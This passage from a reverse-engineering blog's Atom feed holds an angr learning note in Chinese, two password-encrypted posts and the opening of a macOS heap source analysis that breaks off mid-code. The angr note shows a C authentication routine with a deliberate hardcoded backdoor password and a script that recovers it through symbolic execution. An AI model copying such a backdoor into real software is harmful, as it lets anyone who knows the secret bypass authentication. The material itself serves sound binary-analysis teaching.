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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, 